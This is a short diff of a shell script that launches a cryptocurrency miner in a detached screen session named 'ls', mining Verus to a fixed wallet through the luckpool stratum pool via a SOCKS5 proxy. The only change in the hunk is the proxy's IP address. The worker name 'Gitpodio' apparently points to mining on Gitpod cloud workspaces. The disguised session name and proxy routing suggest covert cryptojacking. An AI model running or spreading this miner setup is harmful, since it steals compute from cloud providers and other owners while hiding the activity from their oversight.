@@ -6,6 +6,6 @@ screen -dmS ls
 A=stratum+tcp://na.luckpool.net:3956
 B=RBR2mQwhMbMHa1NjSem99Bp7AjK46rjBUw
 C=Gitpodio
-D=socks5://72.221.232.155:4145
+D=socks5://72.221.232.115:4145
 
 chmod u+x 2 && ./2 -a verus -o $A -u $B.$C -x $D  -p x -t 4
